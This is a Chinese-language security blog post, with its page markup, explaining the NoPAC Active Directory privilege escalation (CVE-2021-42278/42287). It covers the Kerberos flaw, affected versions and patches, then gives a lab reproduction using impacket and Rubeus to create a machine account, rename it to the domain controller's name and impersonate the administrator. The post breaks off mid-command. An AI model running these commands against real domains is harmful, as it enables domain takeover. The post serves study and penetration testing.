@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven | Starven's Blog</title><meta name="author" content="Starven"><meta name="copyright" content="Starven"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最近在打某项目的跨vlan渗透的时候，第二个vlan段有一个域环境，当时接管全域拿下域控就是通过NoPAC打的，拿下第二个vlan段的域控之后通过横向到其他域成员机抓rdp凭据才打到第三个vlan段 回想最初学域渗透的时候，实话实说当时并没有太实操过这个洞，只大概了解原理，既然都用到了，还是再深入复现一下吧 最初学的时候也抓过分析过kerberos的流量，缘由是在于我对这些是有掌握和了解的，因此这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven">
+<meta property="og:url" content="https://starven-l.github.io/2025/08/10/NoPAC%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E6%88%98%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-By-Starven/index.html">
+<meta property="og:site_name" content="Starven&#39;s Blog">
+<meta property="og:description" content="最近在打某项目的跨vlan渗透的时候，第二个vlan段有一个域环境，当时接管全域拿下域控就是通过NoPAC打的，拿下第二个vlan段的域控之后通过横向到其他域成员机抓rdp凭据才打到第三个vlan段 回想最初学域渗透的时候，实话实说当时并没有太实操过这个洞，只大概了解原理，既然都用到了，还是再深入复现一下吧 最初学的时候也抓过分析过kerberos的流量，缘由是在于我对这些是有掌握和了解的，因此这">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim">
+<meta property="article:published_time" content="2025-08-10T14:40:06.000Z">
+<meta property="article:modified_time" content="2025-08-10T14:49:37.443Z">
+<meta property="article:author" content="Starven">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven",
+  "url": "https://starven-l.github.io/2025/08/10/NoPAC%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E6%88%98%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-By-Starven/",
+  "image": "https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim",
+  "datePublished": "2025-08-10T14:40:06.000Z",
+  "dateModified": "2025-08-10T14:49:37.443Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Starven",
+      "url": "https://starven-l.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://starven-l.github.io/2025/08/10/NoPAC%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E6%88%98%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-By-Starven/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-archive"></i><span> 文档</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" alt="Logo"><span class="site-name">Starven's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-archive"></i><span> 文档</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-10T14:40:06.000Z" title="发表于 2025-08-10 22:40:06">2025-08-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-10T14:49:37.443Z" title="更新于 2025-08-10 22:49:37">2025-08-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>最近在打某项目的跨vlan渗透的时候，第二个vlan段有一个域环境，当时接管全域拿下域控就是通过NoPAC打的，拿下第二个vlan段的域控之后通过横向到其他域成员机抓rdp凭据才打到第三个vlan段</p>
+<p>回想最初学域渗透的时候，实话实说当时并没有太实操过这个洞，只大概了解原理，既然都用到了，还是再深入复现一下吧</p>
+<p>最初学的时候也抓过分析过kerberos的流量，缘由是在于我对这些是有掌握和了解的，因此这里在流量层面就不再赘述</p>
+<p>因此建议初学者：</p>
+<ul>
+<li>对流量层面进行分析</li>
+<li>S4U2Self为什么可以重新生成PAC的原理进行分析</li>
+</ul>
+<p>因此本文我把重心放在两个问题：也当是一个复习了</p>
+<ul>
+<li>如何让KDC找不到UserName？【有两种方法，一种是跨域，一种就是我们本文用的修改sAMAccountName属性】</li>
+<li>如何让KDC在TGS-REP里面用的PAC重新生成而不是拷贝TGT的PAC【也有两种方法，一种还是跨域，另一种就是我们本文用的使用S4U2Self协议去请求】</li>
+</ul>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2408">https://forum.butian.net/share/2408</a></p>
+<p><strong><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/L_wSDyryEG6-9XydwitH2w">https://mp.weixin.qq.com/s/L_wSDyryEG6-9XydwitH2w</a> 【谢公子学安全-域内最新提权漏洞原理深入分析】</strong></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA">https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA</a> 【<strong>从XP源码泄露看nopac漏洞</strong>】</p>
+<p>用到的工具：【这是在漏洞复现原理的时候分布需要用到的工具】</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus/tree/master">https://github.com/GhostPack/Rubeus/tree/master</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/pull/1224">https://github.com/SecureAuthCorp/impacket/pull/1224</a></p>
+<p>但是其实在项目中肯定是用武器化的工具</p>
+<p><a target="_blank" rel="noopener" href="https://www.netexec.wiki/ldap-protocol/machine-account-quota">https://www.netexec.wiki/ldap-protocol/machine-account-quota</a>  nxc做漏洞检测</p>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a> nopac武器化工具</p>
+<h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><p>2021 年 11 月 9 日，国外研究员在推特上发布了 Active Directory 相关的 CVE，CVE-2021-42278 &amp; CVE-2021-42287 ，两个漏洞组合可导致域内普通用户权限提升至域管权限</p>
+<p>21年披露了AD域的一个组合漏洞(CVE-2021-42278、CVE-2021-44287)，利用AD域对机器账户的认证缺陷和kerberos协议缺陷，只需一个域用户即可拿到域内最高权限，影响巨大。</p>
+<h1 id="影响范围-CVE-2021-42287："><a href="#影响范围-CVE-2021-42287：" class="headerlink" title="影响范围 CVE-2021-42287："></a><strong>影响范围 CVE-2021-42287：</strong></h1><p>Windows Server 2012 R2 (Server Core installation)</p>
+<p>Windows Server 2012 R2</p>
+<p>Windows Server 2012 (Server Core installation)</p>
+<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1(Server Core installation)</p>
+<p>Windows Server 2012</p>
+<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>
+<p>Windows Server 2008 for x64-based Systems Service Pack 2(Server Core installation)</p>
+<p>Windows Server 2008 for x64-based Systems Service Pack 2</p>
+<p>Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</p>
+<p>Windows Server 2008 for 32-bit Systems Service Pack 2</p>
+<p>Windows Server 2016 (Server Core installation)</p>
+<p>Windows Server 2016</p>
+<p>Windows Server, version 20H2 (Server Core Installation)</p>
+<p>Windows Server, version 2004 (Server Core installation)</p>
+<p>Windows Server 2022 (Server Core installation)</p>
+<p>Windows Server 2022</p>
+<p>Windows Server 2019 (Server Core installation)</p>
+<p>Windows Server 2019</p>
+<p><strong>CVE-2021-42278：</strong></p>
+<p>Windows Server 2012 R2</p>
+<p>Windows Server 2012 (Server Core installation)</p>
+<p>Windows Server 2012</p>
+<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1(Server Core installation)</p>
+<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>
+<p>Windows Server 2008 for x64-based Systems Service Pack 2(Server Core installation)</p>
+<p>Windows Server 2008 for x64-based Systems Service Pack 2</p>
+<p>Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</p>
+<p>Windows Server 2008 for 32-bit Systems Service Pack 2</p>
+<p>Windows Server 2016 (Server Core installation)</p>
+<p>Windows Server 2016</p>
+<p>Windows Server, version 20H2 (Server Core Installation)</p>
+<p>Windows Server, version 2004 (Server Core installation)</p>
+<p>Windows Server 2022 (Server Core installation)</p>
+<p>Windows Server 2019 (Server Core installation)</p>
+<p>Windows Server 2022</p>
+<p>Windows Server 2019</p>
+<p>Windows Server 2012 R2 (Server Core installation)</p>
+<h1 id="漏洞原理：还是微软的检测机制的缺陷和Kerberos对altSecurityIdentities属性的处理逻辑缺陷"><a href="#漏洞原理：还是微软的检测机制的缺陷和Kerberos对altSecurityIdentities属性的处理逻辑缺陷" class="headerlink" title="漏洞原理：还是微软的检测机制的缺陷和Kerberos对altSecurityIdentities属性的处理逻辑缺陷"></a>漏洞原理：还是微软的检测机制的缺陷和Kerberos对<strong>altSecurityIdentities属性的处理逻辑缺陷</strong></h1><h2 id="CVE-2021-42278"><a href="#CVE-2021-42278" class="headerlink" title="CVE-2021-42278"></a>CVE-2021-42278</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">【CVE-<span class="number">2021</span>-<span class="number">42278</span>】默认情况下加入域内的主机都会创建一个机器账户，该账户名称为机器名加上$结尾，加入域的机器默认在CN=Computers这个容器里，账户名为sAMAccountName属性</span><br><span class="line">查看--&gt;高级功能  勾选之后才会出现属性编辑器等功能</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、域中是默认允许域用户创建机器账户的，该属性为MS-DS-Machine-Account-Quota(允许用户在域中创建的机器帐户的数量，普通域用户最多可以创建<span class="number">10</span>个该账户)；</span><br><span class="line">C:\Users\Administrator&gt;dsquery * <span class="string">&quot;DC=root,DC=com&quot;</span> -scope base -attr ms-DS-MachineAccountQuota</span><br><span class="line"> ms-DS-MachineAccountQuota</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>、域控没有针对机器账户名的验证机制，没有校验sAMAccountName结尾的$，即使删除结尾的$照样可以以机器用户身份申请TGT票据。</span><br><span class="line"></span><br><span class="line">所有图见下方</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/imagewrhwrhw4.png?imageSlim" alt="image.png"></p>
+<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%201srhrwr.png?imageSlim" alt="image.png"></p>
+<h2 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h2><p>Kerberos在处理UserName字段（AS-REQ阶段中传递的用户名字段）时，如果找不到 UserName 的话，KDC会继续查找 UserName$，如果还是查找不到的话，KDC会继续查找altSecurityIdentities属性的值的⽤户。正是因为KDC找不到就找altSecurityIdentities属性的值的用户这个处理逻辑，导致了漏洞的产⽣。触发这个点有两种方式</p>
+<ul>
+<li>跨域请求：跨域请求时，⽬标域活动⽬录数据库是找不到其他域的⽤户的，因此会⾛进这个 处理UserName的逻辑。</li>
+<li>修改saMAccountName属性：在当前域，可以通过修改saMAccountName属性让KDC找不到⽤户，然后⾛进这个处理UserName的逻辑。</li>
+</ul>
+<p>但是这还是不够，仅仅让KDC⾛进这个处理UserName的逻辑，还不能伪造⾼权限。因为票据中代表⽤户身份权限是数据块是PAC。⽽TGT认购权证中的PAC是根据预认证身份信息⽣成的，这个我们⽆法伪造。因此得想办法在ST服务票据中进⾏伪造。⽽正常的ST服务票据中的PAC是直接拷⻉TGT认购权证中的。因此，得想办法让KDC在TGS-REP的时候重新⽣成PAC，⽽不是拷⻉TGT票据中的PAC。这⾥也有两种⽅式：</p>
+<ul>
+<li>S4U2Self请求：KDC在处理S4U2Self类型的TGS-REQ请求时，PAC是重新⽣成的。</li>
+<li>跨域⽆PAC的TGT票据进⾏TGS请求：KDC在处理跨域的TGS-REQ请求时，如果携带的TGT认购权证中没有PAC，PAC会重新⽣成。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">【CVE-<span class="number">2021</span>-<span class="number">42287</span>】配合上述漏洞使用，简述一下漏洞原理，创建一个普通机器账户，将其sAMAccountName改为和域控机器账户名相同但不以$结尾，用该账户进行TGT请求后将sAMAccountName改回原名，然后使用之前得到的TGT去申请该主机的ST，在申请服务过程中，由于二次改名后，此时域内已经没有该账户，导致DC找不到它，协议的处理逻辑会自动在主机名后加上$继续搜索，结果就会搜索到域控机器账户，然后在PAC中添加信息(这些信息就是域控机器账户的用户名和所在的组)并以域控机器身份签名下发ST，达到了提权操作。</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a><strong>漏洞利用条件</strong></h1><p>（1）一个普通域成员帐户。</p>
+<p>（2）域用户有创建机器用户的权限（一般默认是有这个权限的）。</p>
+<p>（3）DC未打补丁KB5008380或KB5008602。</p>
+<h1 id="漏洞核心点"><a href="#漏洞核心点" class="headerlink" title="漏洞核心点"></a>漏洞核心点</h1><ol>
+<li>原文作者通过查看网上泄露的xp源代码中关于kerberos的处理流程发现：</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">核心原因是在处理UserName字段时的错误:</span><br><span class="line">(<span class="number">1</span>)首先，如果找不到 UserName 的话，KDC会继续查找 UserName$ </span><br><span class="line">(<span class="number">2</span>)如果还是查找不到的话，KDC会继续查找altSecurityIdentities属性的值的用户</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%202hwrhwr.png?imageSlim" alt="image.png"></p>
+<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%203wrhwr.png?imageSlim" alt="image.png"></p>
+<h2 id="如何让KDC找不到UserName？"><a href="#如何让KDC找不到UserName？" class="headerlink" title="如何让KDC找不到UserName？"></a>如何让KDC找不到UserName？</h2><ul>
+<li>跨域请求：跨域请求时，目标域活动目录数据库是找不到其他域的用户的，因此会走进这个处理UserName的逻辑。</li>
+<li>修改saMAccountName属性：在当前域，可以通过修改saMAccountName属性让KDC找不到用户，然后走进这个处理UserName的逻辑【★】</li>
+</ul>
+<h2 id="如何让KDC在TGS-REP里面重新生成PAC而不是拷贝TGT的PAC？"><a href="#如何让KDC在TGS-REP里面重新生成PAC而不是拷贝TGT的PAC？" class="headerlink" title="如何让KDC在TGS-REP里面重新生成PAC而不是拷贝TGT的PAC？"></a>如何让KDC在TGS-REP里面重新生成PAC而不是拷贝TGT的PAC？</h2><ul>
+<li>S4U2Self请求：KDC在处理S4U2Self类型的TGS-REQ请求时，PAC是重新生成的。</li>
+<li>跨域无PAC的TGT票据进行TGS请求：KDC在处理跨域的TGS-REQ请求时，如果携带的TGT认购权证中没有PAC，PAC会重新生成。</li>
+</ul>
+<h1 id="漏洞复现与利用"><a href="#漏洞复现与利用" class="headerlink" title="漏洞复现与利用"></a>漏洞复现与利用</h1><p>注意：第一个漏洞利用的时候，机器账户改名前，需要清除其SPN值【因为：域内添加一个机器账户会自动添加四个默认的SPN值】这些都需要清除（但是我自己动手实验的时候并没回默认添加SPN值）</p>
+<p>可能是因为工具差异吧，原文用的是<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">Powermad.ps1</a>我用的是impacket的addcomputer.py</p>
+<h2 id="1-新建一个普通的机器账户"><a href="#1-新建一个普通的机器账户" class="headerlink" title="1. 新建一个普通的机器账户"></a>1. 新建一个普通的机器账户</h2><p>【注意：Windows下执行命令不要用单引号包裹，用双引号，否则单引号会被当作普通字符】</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python addcomputer.py -computer-name <span class="string">&quot;evil_machine&quot;</span> -computer-pass <span class="string">&quot;lwjqwert123456.&quot;</span> -dc-ip <span class="number">192.168</span><span class="number">.161</span><span class="number">.129</span> <span class="string">&quot;root.com/administrator:域管密码&quot;</span> -method SAMR -debug</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%204hwrwthwr.png?imageSlim" alt="image.png"></p>
+<h2 id="2-将机器用户evil-machine的saMAccountName属性修改为域控名DC"><a href="#2-将机器用户evil-machine的saMAccountName属性修改为域控名DC" class="headerlink" title="2. 将机器用户evil_machine的saMAccountName属性修改为域控名DC"></a>2. 将机器用户evil_machine的saMAccountName属性修改为域控名DC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python renameMachine.py -current-name <span class="string">&quot;evil_machine$&quot;</span> -<span class="keyword">new</span>-name <span class="string">&quot;DC&quot;</span> -dc-ip <span class="number">192.168</span><span class="number">.161</span><span class="number">.129</span> <span class="string">&quot;root.com/administrator:域管密码&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注意这个工具我发现我的examples里面并没有，而是当年提在pr里面的</span><br><span class="line">git clone https:<span class="comment">//github.com/fortra/impacket.git</span></span><br><span class="line">cd impacket</span><br><span class="line">git fetch origin pull/<span class="number">1224</span>/head:pr-renameMachine</span><br><span class="line">git checkout pr-renameMachine</span><br><span class="line">pip install .</span><br><span class="line">然后examples/ 目录就会有 renameMachine.py了</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%205hwrhwrw.png?imageSlim" alt="image.png"></p>
+<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%206hhwrhwr.png?imageSlim" alt="image.png"></p>
+<h2 id="3-请求带有PAC的正常的TGT认购权证"><a href="#3-请求带有PAC的正常的TGT认购权证" class="headerlink" title="3. 请求带有PAC的正常的TGT认购权证"></a>3. 请求带有PAC的正常的TGT认购权证</h2><p>注意：rubeus工具底层的处理逻辑是调用.NET库是本台机器的上下文进程，因此我才物理机执行命令并不会像nopac.py这种武器化工具来根据我的凭据来请求一个虚拟的域成员机的网络上下文</p>
+<p>所以使用rubeus还是得在域成员机的环境下去执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rubeus.exe asktgt /user:<span class="string">&quot;DC&quot;</span> /password:<span class="string">&quot;lwjqwert123456.&quot;</span> /domain:<span class="string">&quot;root.com&quot;</span> /dc:<span class="string">&quot;DC.root.com&quot;</span>  /nowrap /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%207hwrhw.png?imageSlim" alt="image.png"></p>
+<h2 id="4-接着将机器用户evil-machine-的saMAccountName属性还原"><a href="#4-接着将机器用户evil-machine-的saMAccountName属性还原" class="headerlink" title="4. 接着将机器用户evil_machine$的saMAccountName属性还原"></a>4. 接着将机器用户evil_machine$的saMAccountName属性还原</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python renameMachine.py -current-name <span class="string">&quot;DC&quot;</span> -<span class="keyword">new</span>-name <span class="string">&quot;evil_machine$&quot;</span> -dc-ip <span class="number">192.168</span><span class="number">.161</span><span class="number">.129</span> <span class="string">&quot;root.com/administrator:域管密码&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%208whrwrhwrs.png?imageSlim" alt="image.png"></p>
+<h2 id="5-用带PAC的正常的TGT【利用S4u2Self协议】请求访问ldap-DC-root-com的ST服务票据，并且将票据导入内存中"><a href="#5-用带PAC的正常的TGT【利用S4u2Self协议】请求访问ldap-DC-root-com的ST服务票据，并且将票据导入内存中" class="headerlink" title="5. 用带PAC的正常的TGT【利用S4u2Self协议】请求访问ldap&#x2F;DC.root.com的ST服务票据，并且将票据导入内存中"></a>5. 用带PAC的正常的TGT【利用S4u2Self协议】请求访问ldap&#x2F;DC.root.com的ST服务票据，并且将票据导入内存中</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:<span class="string">&quot;administrator&quot;</span> /altservice:<span class="string">&quot;ldap/DC.root.com&quot;</span> /dc:<span class="string">&quot;DC.root.com&quot;</span> /ptt /ticket:上一步带PAC的TGT认购权证</span><br><span class="line"></span><br><span class="line">Rubeus.exe s4u /self /impersonateuser:<span class="string">&quot;administrator&quot;</span> /altservice:<span class="string">&quot;ldap/DC.root.com&quot;</span> /dc:<span class="string">&quot;DC.root.com&quot;</span> /ptt 